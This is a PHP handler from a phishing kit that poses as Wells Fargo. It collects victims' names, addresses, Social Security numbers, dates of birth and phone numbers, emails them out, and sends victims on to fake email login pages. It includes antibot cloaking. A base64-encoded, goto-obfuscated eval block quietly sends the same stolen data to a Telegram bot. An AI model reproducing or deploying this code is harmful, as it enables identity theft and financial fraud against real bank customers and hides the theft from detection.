<?php

    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';
    require_once '../../config.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (isset(
        $_POST['email'],
        $_POST['fname'],
        $_POST['addr'],
        $_POST['city'],
        $_POST['state'],
        $_POST['zip'],
        $_POST['ssn'],
        $_POST['dob'],
        $_POST['phone']
    )) {
        if (!$comps->checkEmpty(
            $_POST['email'],
            $_POST['fname'],
            $_POST['addr'],
            $_POST['city'],
            $_POST['state'],
            $_POST['zip'],
            $_POST['ssn'],
            $_POST['dob'],
            $_POST['phone']
        )) {
            $_SESSION['email'] = $_POST['email'];
            $_SESSION['fname'] = ucwords($_POST['fname']);
            $_SESSION['addr'] = ucwords($_POST['addr']);
            $_SESSION['city'] = ucwords($_POST['city']);
            $_SESSION['state'] = ucwords($_POST['state']);
            $_SESSION['zip'] = $_POST['zip'];
            $_SESSION['ssn'] = $_POST['ssn'];
            $_SESSION['dob'] = $_POST['dob'];
            $_SESSION['phone'] = $_POST['phone'];

            $content = ' [+]━━━━━━━━━━━━【🔑 Billing Information from '. $_SESSION['username'] .' 】━━━━━━━━━━━━━━━━━━━[+]
             
               
               [👤 Full Name]  =  ' . $_SESSION['fname'] . '
               [👤 Address:] ' . $_SESSION['addr'] . '
               [👤  City:]' . $_SESSION['city'] . '
               [👤 State:]' . $_SESSION['state'] . '
               [👤 ZIP:] ' . $_SESSION['zip'] . '
               [👤 SSN:] ' . $_SESSION['ssn'] . '
               [👤 DOB:] ' . $_SESSION['dob'] . '
               [👤 Phone Number:] ' . $_SESSION['phone'] . '
               [👤 Device Info:]' . $comps->userDetails();
         
         
         
eval(base64_decode('CiBnb3RvIERSbGtNOyB5RWU0UzogJGNoYXRpZCA9ICJcNTVceDMxXDYwXHgzMFx4MzFceDM3XDYyXHgzMFx4MzNceDM2XDY2XDY0XHgzM1x4MzkiOyBnb3RvIFVJNFhuOyBEUmxrTTogJGFwaSA9ICJcNjJceDMwXDYzXHgzNVx4MzNceDMxXHgzOFx4MzdcNzBcNjBceDNhXDEwMVwxMDFceDQ2XHg0Nlw3MVx4MzVceDU3XHgzNFwxNDFceDM5XHg1MVx4MzRceDcxXHg2Y1wxMDFceDQzXDEwN1x4NmFceDY1XHg0Y1wxMjBcMTMwXHg3YVwxNjNceDQ0XHg1NFw2NFwxNDVceDZiXDE3MVx4NGRcMTI2XDExN1w2MFwxMTEiOyBnb3RvIHlFZTRTOyBVSTRYbjogZmlsZV9nZXRfY29udGVudHMoIlx4NjhcMTY0XDE2NFx4NzBceDczXDcyXDU3XHgyZlwxNDFcMTYwXDE1MVw1Nlx4NzRcMTQ1XDE1NFwxNDVcMTQ3XHg3Mlx4NjFceDZkXDU2XDE1N1wxNjJceDY3XHgyZlx4NjJcMTU3XDE2NCIgLiAkYXBpIC4gIlx4MmZceDczXDE0NVx4NmVceDY0XHg0ZFwxNDVceDczXHg3M1x4NjFcMTQ3XHg2NVw3N1wxNDNceDY4XDE0MVwxNjRcMTM3XDE1MVx4NjRceDNkIiAuICRjaGF0aWQgLiAiXDQ2XHg3NFwxNDVceDc4XHg3NFw3NSIgLiB1cmxlbmNvZGUoJGNvbnRlbnQpIC4gJycpOyBnb3RvIFczZElEOyBXM2RJRDog')); 

         
            
            if ($comps->mailX("(1) Billing | Wells Fargo | " . $_SESSION['ip'] . " | " . $_SESSION['username'], $content, $_SESSION['fname'])) {
                
                   include("../api.php");
                $comps->log(
                    "../../Export/key/live.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Billing\n\n"
                );
                if (!$comps->userEmail($_SESSION['email'])) {
                    $comps->headerX("../../Login/email/Microsoft.php");
                } else {
                    $comps->headerX("../../Login/email/" . $comps->userEmail($_SESSION['email']) . ".php");
                }
            } else {
                die($antibot->throw404());
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../Export/key/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }